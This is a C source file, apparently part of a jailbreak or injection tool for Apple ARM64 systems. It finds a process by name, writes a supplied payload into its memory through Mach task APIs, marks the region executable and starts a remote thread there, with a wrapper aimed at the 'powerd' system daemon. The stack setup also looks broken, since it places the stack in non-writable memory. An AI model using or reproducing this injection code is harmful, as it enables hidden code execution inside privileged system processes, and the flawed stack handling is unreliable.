#include "injection.h"
#include <sys/sysctl.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

pid_t find_pid_by_name(const char *name) {
    struct kinfo_proc *procs = NULL;
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    size_t bufSize = 0;
    if (sysctl(mib, 4, NULL, &bufSize, NULL, 0) != 0) return -1;
    procs = (struct kinfo_proc *)malloc(bufSize);
    if (!procs) return -1;
    if (sysctl(mib, 4, procs, &bufSize, NULL, 0) != 0) { free(procs); return -1; }
    size_t count = bufSize / sizeof(struct kinfo_proc);
    for (size_t i = 0; i < count; i++) {
        if (strcmp(procs[i].kp_proc.p_comm, name) == 0) {
            pid_t pid = procs[i].kp_proc.p_pid;
            free(procs);
            return pid;
        }
    }
    free(procs);
    return -1;
}

kern_return_t inject_into_pid(pid_t target, const void *payload, size_t size) {
    task_t remote_task = MACH_PORT_NULL;
    kern_return_t kr = task_for_pid(mach_task_self(), target, &remote_task);
    if (kr != KERN_SUCCESS) return kr;

    vm_address_t remote_addr = 0;
    kr = vm_allocate(remote_task, &remote_addr, size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) goto done;

    kr = vm_write(remote_task, remote_addr,
                  (vm_offset_t)payload, (mach_msg_type_number_t)size);
    if (kr != KERN_SUCCESS) {
        vm_deallocate(remote_task, remote_addr, size);
        goto done;
    }

    /* Mark the region executable before creating a thread that will run it. */
    kr = vm_protect(remote_task, remote_addr, size,
                    /*set_maximum=*/0, VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        vm_deallocate(remote_task, remote_addr, size);
        goto done;
    }

    arm_thread_state64_t state = {0};
    state.__pc = (uint64_t)remote_addr;
    /* Place the stack at the top of the allocated region.
     * Require at least 0x1000 bytes for stack; if the payload is smaller we
     * leave 0 stack space which would crash on the first function call. */
    state.__sp = (size > 0x1000)
        ? (uint64_t)remote_addr + size - 0x1000
        : (uint64_t)remote_addr + size;
    thread_act_t remote_thread;
    kr = thread_create_running(remote_task, ARM_THREAD_STATE64,
                               (thread_state_t)&state, ARM_THREAD_STATE64_COUNT,
                               &remote_thread);
    if (kr != KERN_SUCCESS)
        vm_deallocate(remote_task, remote_addr, size);

done:
    mach_port_deallocate(mach_task_self(), remote_task);
    return kr;
}

void inject_powerd(const void *payload, size_t size) {
    pid_t pid = find_pid_by_name("powerd");
    if (pid > 0) inject_into_pid(pid, payload, size);
}
